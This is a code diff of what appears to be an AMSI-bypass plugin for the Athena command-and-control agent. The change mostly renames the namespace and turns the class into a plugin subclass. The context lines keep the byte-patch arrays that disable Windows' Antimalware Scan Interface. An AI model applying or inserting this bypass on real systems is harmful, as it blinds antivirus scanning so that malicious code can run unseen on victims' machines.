@@ -2,9 +2,9 @@
 using System.Runtime.InteropServices;
 using System.Text;
 
-namespace Plugin
+namespace Plguins
 {
-    public static class amsi
+    public class Plugin : AthenaPlugin
     {
         static byte[] sword = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
         static byte[] spear = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
@@ -22,8 +22,7 @@ namespace Plugin
 
         [DllImport("kernel32")]
         public static extern IntPtr LoadLibrary(string name);
-        
-        public static void Execute(Dictionary<string, object> args)
+        public override void Execute(Dictionary<string, object> args)
         {
             try
             {
@@ -44,7 +43,7 @@ namespace Plugin
                     }
                 }
 
-                PluginHandler.Write("Failed", (string)args["task-id"],true,"error");
+                PluginHandler.Write("Failed", (string)args["task-id"], true, "error");
                 return;
             }
             catch (Exception e)
@@ -53,7 +52,6 @@ namespace Plugin
                 PluginHandler.Write(e.ToString(), (string)args["task-id"], true, "error");
             }
         }
-
         private static bool SpearAndShield(byte[] shield)
         {
             try
